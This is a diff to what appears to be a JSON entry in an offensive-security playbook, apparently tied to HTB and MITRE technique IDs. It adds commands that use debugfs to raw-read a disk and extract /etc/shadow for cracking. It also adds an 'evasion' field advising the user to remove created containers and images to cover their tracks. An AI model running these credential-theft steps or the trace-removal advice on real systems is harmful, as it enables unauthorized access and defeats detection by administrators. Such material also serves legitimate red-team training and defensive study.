@@ -77,6 +77,23 @@
       "HTB M25",
       "MITRE T1078.001",
       "MITRE T1083"
-    ]
-  }
+    ],
+    "evasion": "Use a single container/mount escape that reads what you need and exits; remove images/containers you created (docker rmi / lxc delete); avoid leaving a privileged container running."
+  },
+  "variations": [
+    {
+      "label": "Read shadow via debugfs",
+      "command": "debugfs -R 'cat /etc/shadow' /dev/sda1"
+    }
+  ],
+  "steps": [
+    {
+      "label": "Raw-read the disk (disk group)",
+      "command": "debugfs /dev/sda1"
+    },
+    {
+      "label": "Extract /etc/shadow and crack",
+      "command": "debugfs -R 'cat /etc/shadow' /dev/sda1 | tee shadow"
+    }
+  ]
 }
